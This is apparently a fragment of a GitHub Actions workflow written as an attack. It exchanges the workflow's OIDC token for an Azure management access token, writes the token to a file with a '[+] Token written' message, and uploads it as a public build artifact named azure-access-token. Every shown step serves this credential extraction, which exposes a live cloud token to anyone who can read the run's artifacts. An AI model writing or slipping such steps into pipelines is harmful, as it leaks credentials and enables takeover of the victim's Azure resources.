      - name: Exchange and dump token
        run: |
          ACCESS_TOKEN=$(curl -s -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "client_id=c265ea2a-1235-446d-bd74-5d8228c904b1&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${{ steps.oidc.outputs.id_token }}&scope=https://management.azure.com/.default" \
            "https://login.microsoftonline.com/fdd066e1-ee37-49bc-b08f-d0e152119b04/oauth2/v2.0/token" | jq -r .access_token)

          echo "$ACCESS_TOKEN" > token.txt
          echo "[+] Token written to token.txt"
      
      - name: Upload token.txt as artifact
        uses: actions/upload-artifact@v3
        with:
          name: azure-access-token
          path: token.txt
